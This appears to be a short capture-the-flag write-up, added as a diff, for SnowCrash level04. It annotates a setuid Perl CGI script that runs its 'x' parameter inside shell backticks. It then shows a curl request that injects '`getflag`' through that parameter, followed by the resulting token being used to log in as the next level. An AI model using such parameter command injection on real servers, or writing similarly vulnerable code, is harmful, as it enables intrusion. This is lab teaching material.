@@ -1,0 +1,30 @@
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+level04@SnowCrash:~$ 
+
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl					# Indicates the path of the interpreter, like for bash (#!/bin/bash)
+# localhost:4747				# Web server hosted on local machine and reachable via the port 4747
+use CGI qw{param};				# In Perl, CGI is a protocol for executing scripts via web requests
+print "Content-type: text/html\n\n";		# Print the string when it's execute
+sub x {						# Define function 'x'
+  $y = $_[0];					# Variable 'y' take the value of the variable passed as parameter
+  print `echo $y 2>&1`;				# Print variable 'y' ('2>&1' is for error handling)
+}
+x(param("x"));					# Call function 'x'
+level04@SnowCrash:~$ 
+
+
+
+In the code above, it will print with echo the output of the command. In others terms it will print the value of the variable 'x' passed as parameter. Send a request to the script with curl and supply it the parameter x=getflag
+
+
+
+level04@SnowCrash:~$ curl localhost:4747?x='`getflag`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$ 
+
+level04@SnowCrash:~$ su level05
+Password: ne2searoevaevoem4ov4ar8ap
+level05@SnowCrash:~$ 
